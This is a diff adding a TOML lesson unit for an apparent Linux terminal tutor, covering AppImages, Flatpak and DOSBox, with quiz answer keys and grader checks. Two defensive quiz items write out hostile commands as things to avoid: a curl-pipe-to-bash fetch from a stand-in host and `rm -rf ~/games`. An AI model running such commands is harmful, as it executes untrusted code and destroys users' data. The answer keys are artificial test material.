@@ -1,0 +1,290 @@
+id = "apps-and-games"
+number = 9
+title = "Apps & Games on Linux"
+summary = "Launch portable AppImages, discover apps with Flatpak and your package manager, and run classic DOS games with DOSBox."
+badge = "game_runner"
+unlock_after = "finding-your-way"
+
+[[lessons]]
+id = "u9-portable-apps"
+title = "Portable Apps & AppImages"
+intro = "Many indie games and desktop tools ship as a single .AppImage file. Make it executable with chmod +x, launch it with ./, handle missing FUSE 2, and skip unsafe web scripts."
+
+[[lessons.questions]]
+kind = "explain_choice"
+id = "u9-l1-q1"
+command = "chmod +x SpaceQuest.AppImage"
+prompt = "You downloaded a game named `SpaceQuest.AppImage`, and Linux says `Permission denied` when you try to start it. What does `chmod +x SpaceQuest.AppImage` do?"
+choices = [
+    "Deletes `SpaceQuest.AppImage` permanently",
+    "Marks `SpaceQuest.AppImage` as executable so Linux lets you run it like a program",
+    "Installs `SpaceQuest.AppImage` into `/usr/bin` for all users",
+    "Unzips `SpaceQuest.AppImage` into a folder",
+]
+answer = 1
+hint = "The `+x` permission stands for \"execute\" — permission to run a file as a program."
+note = "Fresh downloads usually arrive without execute permission for safety. One quick `chmod +x` flips the runnable switch on."
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l1-q2"
+prompt = "Now that `SpaceQuest.AppImage` is executable, type the command to run it right from your current folder."
+accepted = ["./SpaceQuest.AppImage"]
+hints = [
+    "Put `./` in front of the filename so the shell runs the file in this folder.",
+    "Type `./SpaceQuest.AppImage`.",
+]
+note = "Linux does not search your current folder automatically when you type a command name — `./` tells the shell \"run the program right here\"."
+
+[[lessons.questions]]
+kind = "read_output"
+id = "u9-l1-q3"
+command = "./SpaceQuest.AppImage"
+output = """
+dlopen(): error loading libfuse.so.2
+AppImages require FUSE to run.
+"""
+prompt = "You launched `./SpaceQuest.AppImage` and got this error. Why did it stop, and how can you run the game right away?"
+choices = [
+    "The game download is broken and cannot ever run on Linux",
+    "Your system is missing FUSE 2 (`libfuse.so.2`); run it with `--appimage-extract-and-run` (or install `fuse2` / `libfuse2`)",
+    "You forgot to delete the `.AppImage` extension first",
+    "AppImages can only be opened inside `nano`",
+]
+answer = 1
+hint = "Older AppImages mount themselves with FUSE 2 (`libfuse.so.2`), unless you tell them to unpack into a temporary folder and run."
+note = "Adding `--appimage-extract-and-run` (or setting `APPIMAGE_EXTRACT_AND_RUN=1`) skips FUSE completely and launches the AppImage right away!"
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l1-q4"
+prompt = "Launch `./SpaceQuest.AppImage` without FUSE by passing `--appimage-extract-and-run` (or `env APPIMAGE_EXTRACT_AND_RUN=1`)."
+accepted = [
+    "./SpaceQuest.AppImage --appimage-extract-and-run",
+    "env APPIMAGE_EXTRACT_AND_RUN=1 ./SpaceQuest.AppImage",
+    "APPIMAGE_EXTRACT_AND_RUN=1 ./SpaceQuest.AppImage",
+]
+hints = [
+    "Run `./SpaceQuest.AppImage` followed by `--appimage-extract-and-run` (or put `env APPIMAGE_EXTRACT_AND_RUN=1` in front).",
+    "Type `./SpaceQuest.AppImage --appimage-extract-and-run`.",
+]
+note = "Nice! If you ever see `libfuse.so.2` errors again, `huh why` will even suggest this exact workaround for you."
+
+[[lessons.questions]]
+kind = "spot_danger"
+id = "u9-l1-q5"
+prompt = "A random post in a game chat says to run `curl -fsSL https://free-games.example/install.sh | bash` to unlock free games. Why does `huh` warn against this?"
+command = "curl -fsSL https://free-games.example/install.sh | bash"
+choices = [
+    "`curl` only works for music files",
+    "It downloads a script from the internet and executes it immediately before you have read a single line",
+    "The `|` symbol turns off your sound card",
+    "`bash` cannot run `.sh` scripts",
+]
+answer = 1
+risk = "runs code from the internet"
+hint = "Follow the pipe: `curl` pulls an unseen script from a web link and hands it straight to `bash`."
+note = "Never pipe an untrusted download straight into `bash`! Stick to your distro's packages, Flathub, or official releases you inspect first."
+
+[[lessons]]
+id = "u9-flatpak-and-packages"
+title = "App Stores & Flatpak"
+intro = "Find and launch sandboxed desktop apps from Flathub using flatpak, or install classic packages straight from your distro."
+
+[[lessons.questions]]
+kind = "explain_choice"
+id = "u9-l2-q1"
+command = "flatpak search retro"
+prompt = "You want to look for retro game apps on Flathub before installing anything. What does `flatpak search retro` do?"
+choices = [
+    "Searches configured Flatpak remotes (like Flathub) for apps matching `retro` without installing anything",
+    "Uninstalls every game on your computer",
+    "Launches RetroArch in full-screen mode",
+    "Downloads your whole search history",
+]
+answer = 0
+hint = "`flatpak search` is read-only — it just looks up matching app names and IDs."
+note = "`flatpak search` shows each matching app's description and its reverse-domain App ID (like `org.retroarch.RetroArch`)."
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l2-q2"
+prompt = "Install `org.retroarch.RetroArch` from the `flathub` remote using `flatpak install`."
+accepted = [
+    "flatpak install flathub org.retroarch.RetroArch",
+    "flatpak install -y flathub org.retroarch.RetroArch",
+    "flatpak install --user flathub org.retroarch.RetroArch",
+    "flatpak install org.retroarch.RetroArch",
+]
+hints = [
+    "Use `flatpak install` followed by the remote `flathub` and the app ID `org.retroarch.RetroArch`.",
+    "Type `flatpak install flathub org.retroarch.RetroArch`.",
+]
+note = "Flatpak keeps desktop apps neatly sandboxed with their own libraries, so the same app works across almost any Linux distro."
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l2-q3"
+prompt = "Launch your installed Flatpak app `org.retroarch.RetroArch` from the terminal using `flatpak run`."
+accepted = ["flatpak run org.retroarch.RetroArch"]
+hints = [
+    "Use `flatpak run` followed by the app ID.",
+    "Type `flatpak run org.retroarch.RetroArch`.",
+]
+note = "Flatpak apps also appear in your desktop app launcher, and `flatpak run <app-id>` lets you start them right from a terminal."
+
+[[lessons.questions]]
+kind = "explain_choice"
+id = "u9-l2-q4"
+command = "{pkg_install:dosbox}"
+prompt = "Many classic emulators and tools live directly in your Linux distro's own package store. What does `{pkg_install:dosbox}` do?"
+choices = [
+    "Installs `dosbox` from your distro's trusted repositories",
+    "Reboots your computer into MS-DOS",
+    "Removes `dosbox` and deletes your saves",
+    "Only searches for `dosbox` without installing it",
+]
+answer = 0
+hint = "This uses your system's native package manager (`{pkg_install}`)."
+note = "Checking your distro's package manager first gives you fast, signed installs that update right alongside the rest of your system."
+
+[[lessons.questions]]
+kind = "explain_choice"
+id = "u9-l2-q5"
+command = "flatpak list"
+prompt = "You want to see which Flatpak apps are currently installed on your computer. What does `flatpak list` do?"
+choices = [
+    "Updates every app without asking",
+    "Lists the Flatpak applications and runtimes installed on your machine",
+    "Deletes unused Flatpak apps",
+    "Shows your Wi-Fi password",
+]
+answer = 1
+hint = "`flatpak list` is read-only — it prints what is already installed."
+note = "`flatpak list` is handy when you forget an app's full ID (`org.something.App`) before running or uninstalling it."
+
+[[lessons]]
+id = "u9-classic-dosbox"
+title = "Classic Games with DOSBox"
+intro = "Unpack zipped classic games into neat folders, inspect .exe files with file, launch DOS games in dosbox, and guard your saves."
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l3-q1"
+prompt = "Unpack `doom-shareware.zip` into a clean subfolder named `games/doom` using `unzip` with `-d`."
+accepted = [
+    "unzip doom-shareware.zip -d games/doom",
+    "unzip -d games/doom doom-shareware.zip",
+    "unzip doom-shareware.zip -d ./games/doom",
+    "unzip -d ./games/doom doom-shareware.zip",
+]
+hints = [
+    "Pass the zip filename to `unzip`, then `-d` followed by the destination folder `games/doom`.",
+    "Type `unzip doom-shareware.zip -d games/doom`.",
+]
+note = "Always unpack game zips into their own `-d <folder>` so dozens of game files do not spill into your Downloads folder!"
+
+[[lessons.questions]]
+kind = "read_output"
+id = "u9-l3-q2"
+command = "file DOOM.EXE"
+output = "DOOM.EXE: MS-DOS executable, MZ for MS-DOS"
+prompt = "Running `./DOOM.EXE` in bash failed with `Exec format error`, so you checked it with `file DOOM.EXE`. What does this tell you?"
+choices = [
+    "It is a bash script — run `bash DOOM.EXE`",
+    "It is an MS-DOS program (`MZ`), not a native Linux binary — launch it inside `dosbox` instead",
+    "It is a broken text file you should delete",
+    "You just need to run `chmod 777 DOOM.EXE`",
+]
+answer = 1
+hint = "`Exec format error` means Linux cannot run that binary format directly; `file` reveals it is built for MS-DOS."
+note = "When bash says `Exec format error`, `file <target>` tells you what kind of program it actually is: DOS games run in `dosbox`, and Windows apps use `wine` or Steam Proton."
+
+[[lessons.questions]]
+kind = "explain_choice"
+id = "u9-l3-q3"
+command = "dosbox games/doom/DOOM.EXE"
+prompt = "What does `dosbox games/doom/DOOM.EXE` do?"
+choices = [
+    "Starts DOSBox, mounts `games/doom` as a virtual C: drive, and runs `DOOM.EXE` inside it",
+    "Converts `DOOM.EXE` into an AppImage",
+    "Deletes `DOOM.EXE` after checking its checksum",
+    "Uploads `DOOM.EXE` to Flathub",
+]
+answer = 0
+hint = "Passing a `.exe` path directly to `dosbox` sets up the drive mount and starts the game in one step."
+note = "DOSBox recreates a classic DOS PC safely in a window without touching your Linux system files."
+
+[[lessons.questions]]
+kind = "type_command"
+id = "u9-l3-q4"
+prompt = "Start `dosbox` inside the `games/doom` folder so you get a classic `C:\\>` DOS prompt ready to run files there."
+accepted = [
+    "dosbox games/doom",
+    "dosbox games/doom/",
+    "dosbox ./games/doom",
+    "dosbox ./games/doom/",
+]
+hints = [
+    "Pass the folder `games/doom` straight to `dosbox`.",
+    "Type `dosbox games/doom`.",
+]
+note = "Opening `dosbox` on a folder is great when a game has a `SETUP.EXE` or `INSTALL.BAT` you want to pick at the `C:\\>` prompt."
+
+[[lessons.questions]]
+kind = "spot_danger"
+id = "u9-l3-q5"
+prompt = "You only meant to tidy old installer zips, NOT lose every game and save file! Which command is DANGEROUS because it permanently erases `~/games` with no trash?"
+choices = [
+    "ls -la ~/games",
+    "du -sh ~/games",
+    "rm -rf ~/games",
+    "dosbox ~/games/doom",
+]
+answer = 2
+risk = "destroys data"
+hint = "Watch out for `rm` combined with `-r` (recursive) and `-f` (force)."
+note = "`rm -rf ~/games` wipes your whole games folder and all saved progress instantly with no Trash bin. Use `gio trash` for files you might miss!"
+
+[practice]
+id = "u9-game-night-setup"
+title = "Game Night Setup"
+goal = "Create a `games` folder, move `downloads/SpaceQuest.AppImage` and `downloads/saves.txt` into `games/`, and make `games/SpaceQuest.AppImage` executable (`chmod +x games/SpaceQuest.AppImage`)."
+hints = [
+    "Make the folder with `mkdir games`, then move both files into it with `mv downloads/SpaceQuest.AppImage downloads/saves.txt games/`.",
+    "Make the game runnable with `chmod +x games/SpaceQuest.AppImage`.",
+]
+
+[practice.setup]
+dirs = ["downloads"]
+files = [
+    { path = "downloads/SpaceQuest.AppImage", content = "#!/bin/sh\necho SpaceQuest ready!\n", mode = 0o644 },
+    { path = "downloads/README.txt", content = "Move SpaceQuest.AppImage and saves.txt into games/, then run chmod +x games/SpaceQuest.AppImage.\n" },
+    { path = "downloads/saves.txt", content = "slot1: asteroid-belt-stage-3\n" },
+]
+
+[[practice.checks]]
+kind = "dir_exists"
+path = "games"
+label = "Folder `games` exists"
+
+[[practice.checks]]
+kind = "file_exists"
+path = "games/SpaceQuest.AppImage"
+label = "`games/SpaceQuest.AppImage` is inside `games/`"
+
+[[practice.checks]]
+kind = "not_exists"
+path = "downloads/SpaceQuest.AppImage"
+label = "`downloads/SpaceQuest.AppImage` was moved out of `downloads/`"
+
+[[practice.checks]]
+kind = "file_mode_has"
+path = "games/SpaceQuest.AppImage"
+bits = 0o111
+label = "`games/SpaceQuest.AppImage` is executable (+x)"
+
+[[practice.checks]]
+kind = "file_exists"
+path = "games/saves.txt"
+label = "`games/saves.txt` moved safely into `games/`"
